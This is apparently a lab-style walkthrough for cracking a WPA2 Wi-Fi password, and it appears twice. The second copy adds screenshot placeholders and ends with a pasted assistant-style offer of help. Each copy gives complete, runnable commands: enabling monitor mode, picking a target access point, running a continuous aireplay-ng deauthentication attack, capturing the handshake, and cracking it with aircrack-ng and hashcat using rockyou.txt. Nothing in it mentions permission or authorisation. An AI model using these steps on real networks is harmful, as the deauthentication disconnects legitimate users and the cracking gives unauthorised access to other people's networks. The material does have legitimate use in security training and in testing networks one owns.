---

# Wireless Access Point Cracking

## Objective
To capture and decrypt a Wi-Fi access point’s password by capturing and cracking a WPA2 handshake.

## Skills Learned
- Network sniffing
- De-authentication attacks
- Password cracking
- Using Wi-Fi hacking tools (airodump-ng, aireplay-ng, aircrack-ng, hashcat)

## Tools Needed
- **Kali Linux** (or any Linux distro with Wi-Fi hacking tools)
- **Wireless Network Adapter** with monitor mode capability

## Steps

---

### 1. Enable Monitor Mode

Monitor mode is essential for capturing packets without needing to connect to a network.

#### 1.1 Identify your wireless card:
```bash
ifconfig
iwconfig
```

#### 1.2 Enable Monitor Mode:
```bash
sudo ifconfig <interface> down
sudo iwconfig <interface> mode monitor
sudo ifconfig <interface> up
```

#### 1.3 If you encounter issues, use `airmon-ng`:
```bash
sudo airmon-ng start <interface>
```

#### 1.4 Kill interfering processes if needed:
```bash
sudo airmon-ng check kill
```

#### 1.5 Verify monitor mode is enabled:
```bash
iwconfig
```

---

### 2. Discover Networks

With your wireless card in monitor mode, it’s time to capture network traffic.

#### 2.1 Scan for all nearby networks:
```bash
airodump-ng <interface>
```
This shows a list of networks and details like BSSID (MAC address) and channel.

#### 2.2 Choose your target network. Note down its BSSID and channel.

#### 2.3 Target one access point:
```bash
airodump-ng -c <channel> --bssid <BSSID> -w <output_file> <interface>
```
- Replace `<channel>` with the target’s channel and `<BSSID>` with the network’s BSSID.
- `<output_file>` is the name of the file to save captured data.

---

### 3. Perform a De-authentication Attack

The purpose here is to disconnect clients so that, upon reconnection, we can capture the four-way handshake.

#### 3.1 De-authenticate clients on the target network:
```bash
aireplay-ng -0 0 -a <BSSID> <interface>
```
- The `-0 0` flag will send deauthentication packets continuously until stopped.

#### 3.2 Stop de-authentication after a few seconds (Ctrl + C) to allow clients to reconnect.

---

### 4. Capture the Four-Way Handshake

To successfully crack the password, we need to capture the handshake, which occurs when a device reconnects to the network.

#### 4.1 Continue running `airodump-ng` (Step 2.3) to monitor the network and capture the handshake.

#### 4.2 Wait for a handshake notification in the airodump-ng window.

#### 4.3 Stop airodump-ng once the handshake is captured (Ctrl + C).

#### 4.4 You’ll see multiple files created with the prefix `<output_file>`. The file ending in `.cap` contains the captured handshake.

---

### 5. Cracking the Password Hash

With the `.cap` file, we can now attempt to crack the password using a brute-force attack with a wordlist.

---

#### 5.1 Prepare the RockYou Wordlist

Kali Linux comes with the large **rockyou.txt** wordlist, which contains over 10 million common passwords.

1. Locate rockyou.txt:
   ```bash
   locate rockyou.txt
   ```
   It should be located at `/usr/share/wordlists/rockyou.txt.gz`.

2. Copy and unzip rockyou.txt (optional):
   ```bash
   cp /usr/share/wordlists/rockyou.txt.gz ~/Desktop
   gzip -d ~/Desktop/rockyou.txt.gz
   ```

---

#### 5.2 Crack the Password with Aircrack-ng

1. Run aircrack-ng using the `.cap` file and rockyou.txt wordlist:
   ```bash
   aircrack-ng -w ~/Desktop/rockyou.txt -b <target_BSSID> <path_to_capture.cap>
   ```
   - Replace `<target_BSSID>` with the target’s BSSID.
   - Replace `<path_to_capture.cap>` with the path to your `.cap` file.

2. Monitor the cracking progress:
   - **Current phrase:** Password currently being tested.
   - **Progress:** Percent of the wordlist checked.
   - **Speed:** Passwords tested per second.
   - **Time left:** Estimated time remaining to test all passwords.

---

#### 5.3 Crack the Password with Hashcat

To crack the password faster, we can use `hashcat`. First, we need to convert the `.cap` file to the `.hccapx` format.

1. **Convert `.cap` to `.hccapx`:**
   - Go to an online converter like [https://hashcat.net/cap2hccapx/](https://hashcat.net/cap2hccapx/).
   - Upload your `.cap` file, convert it, and download the resulting `.hccapx` file.

2. **Run Hashcat**:
   ```bash
   hashcat -a 0 -m 2500 <path_to_hccapx_file> ~/Desktop/rockyou.txt
   ```
   - `-a 0` specifies a dictionary attack mode.
   - `-m 2500` is the hash type for WPA/WPA2.
   - Replace `<path_to_hccapx_file>` with the path to your `.hccapx` file.
   - `~/Desktop/rockyou.txt` is your wordlist.

3. **Monitor Hashcat Output**:
   - Type `s` to check status, speed, and progress.
   - Hashcat may run much faster than Aircrack-ng, especially with GPU acceleration.

4. **Check the Results**:
   - If successful, Hashcat will display the cracked password.
   - You can also see the **hash type** and **speed**. Hashcat often cracks passwords faster than Aircrack-ng, especially with GPU processing.

---

## Final Result

Once the correct password is found, `hashcat` will stop and display it.

> **Note:** The speed of cracking depends on factors such as wordlist size, processor power, and GPU use.

--- 


Here’s the enhanced version with placeholders for images and explanations added for clarity:

---

# Wireless Access Point Cracking

## Objective
To capture and decrypt a Wi-Fi access point’s password by capturing and cracking a WPA2 handshake.

## Skills Learned
- Network sniffing
- De-authentication attacks
- Password cracking
- Using Wi-Fi hacking tools (airodump-ng, aireplay-ng, aircrack-ng, hashcat)

## Tools Needed
- **Kali Linux** (or any Linux distro with Wi-Fi hacking tools)
- **Wireless Network Adapter** with monitor mode capability

## Steps

---

### 1. Enable Monitor Mode

Monitor mode is essential for capturing packets without needing to connect to a network.

#### 1.1 Identify your wireless card:
```bash
ifconfig
iwconfig
```
![ifconfig-blurred](https://github.com/user-attachments/assets/c196636d-492e-45b2-ac58-4e85b9632a49)
![iwconfig](https://github.com/user-attachments/assets/ae6e5961-4a37-4ac3-be8c-dfc01e4546a0)

#### 1.2 Enable Monitor Mode:
```bash
sudo ifconfig <interface> down
sudo iwconfig <interface> mode monitor
sudo ifconfig <interface> up
```

![Monitor-mode-enable](https://github.com/user-attachments/assets/bd9136bd-6a11-423b-b3af-212adb8e15cd)

#### 1.3 If you encounter issues, use `airmon-ng`:
```bash
sudo airmon-ng start <interface>
```

#### 1.4 Kill interfering processes if needed:
```bash
sudo airmon-ng check kill
```

#### 1.5 Verify monitor mode is enabled:
```bash
iwconfig
```
- **[Image with Explanation]:** Screenshot confirming the wireless card is in monitor mode (`iwconfig` output).

---

### 2. Discover Networks

With your wireless card in monitor mode, it’s time to capture network traffic.

#### 2.1 Scan for all nearby networks:
```bash
airodump-ng <interface>
```

![scanning-networks](https://github.com/user-attachments/assets/e3cfa62e-afed-4c09-861c-6921ba9ff519)


#### 2.2 Choose your target network. Note down its BSSID and channel.

![scanning-networks-high-bssid](https://github.com/user-attachments/assets/d2329c5e-efa3-429b-a012-13081e417c56)

#### 2.3 Target one access point:
```bash
airodump-ng -c <channel> --bssid <BSSID> -w <output_file> <interface>
```
![targeted-acceess-point](https://github.com/user-attachments/assets/1d005a58-6ae3-48c2-a7fa-b0799eb5e421)

![target-point-info](https://github.com/user-attachments/assets/b4c9e305-850e-4c94-97db-0d5e54d2c670)
---

### 3. Perform a De-authentication Attack

The purpose here is to disconnect clients so that, upon reconnection, we can capture the four-way handshake.

#### 3.1 De-authenticate clients on the target network:
```bash
aireplay-ng -0 0 -a <BSSID> <interface>
```
- **[Image with Explanation]:** Screenshot of `aireplay-ng` running with deauthentication packets being sent, indicating client disconnection.

#### 3.2 Stop de-authentication after a few seconds (Ctrl + C) to allow clients to reconnect.

---

### 4. Capture the Four-Way Handshake

To successfully crack the password, we need to capture the handshake, which occurs when a device reconnects to the network.

#### 4.1 Continue running `airodump-ng` (Step 2.3) to monitor the network and capture the handshake.

#### 4.2 Wait for a handshake notification in the airodump-ng window.
- **[Image with Explanation]:** Screenshot of `airodump-ng` showing the "WPA handshake" notification at the top of the window.

#### 4.3 Stop airodump-ng once the handshake is captured (Ctrl + C).

#### 4.4 You’ll see multiple files created with the prefix `<output_file>`. The file ending in `.cap` contains the captured handshake.

---

### 5. Cracking the Password Hash

With the `.cap` file, we can now attempt to crack the password using a brute-force attack with a wordlist.

---

#### 5.1 Prepare the RockYou Wordlist

Kali Linux comes with the large **rockyou.txt** wordlist, which contains over 10 million common passwords.

1. Locate rockyou.txt:
   ```bash
   locate rockyou.txt
   ```
   - **[Image with Explanation]:** Screenshot showing the location of `rockyou.txt` in the terminal.

2. Copy and unzip rockyou.txt (optional):
   ```bash
   cp /usr/share/wordlists/rockyou.txt.gz ~/Desktop
   gzip -d ~/Desktop/rockyou.txt.gz
   ```

---

#### 5.2 Crack the Password with Aircrack-ng

1. Run aircrack-ng using the `.cap` file and rockyou.txt wordlist:
   ```bash
   aircrack-ng -w ~/Desktop/rockyou.txt -b <target_BSSID> <path_to_capture.cap>
   ```
   - **[Image with Explanation]:** Screenshot of `aircrack-ng` running, showing progress statistics like current password, speed, and percentage completed.

#### 5.3 Crack the Password with Hashcat

To crack the password faster, we can use `hashcat`. First, we need to convert the `.cap` file to the `.hccapx` format.

1. **Convert `.cap` to `.hccapx`:**
   - Go to an online converter like [https://hashcat.net/cap2hccapx/](https://hashcat.net/cap2hccapx/).
   - **[Image with Explanation]:** Screenshot of the `.cap` file upload process on the online converter.

2. **Run Hashcat**:
   ```bash
   hashcat -a 0 -m 2500 <path_to_hccapx_file> ~/Desktop/rockyou.txt
   ```
   - **[Image with Explanation]:** Screenshot of Hashcat running, showing the status, speed, and estimated time left.

3. **Monitor Hashcat Output**:
   - Type `s` to check status, speed, and progress.

4. **Check the Results**:
   - **[Image with Explanation]:** Screenshot showing the cracked password displayed in the Hashcat output.

---

## Final Result

Once the correct password is found, `hashcat` will stop and display it.

> **Note:** The speed of cracking depends on factors such as wordlist size, processor power, and GPU use.

---

This structure includes clear points where images would be beneficial, making it easier for others to follow and understand your process. Let me know if you need assistance with the screenshots or if you’d like to add any specific illustrations.



 
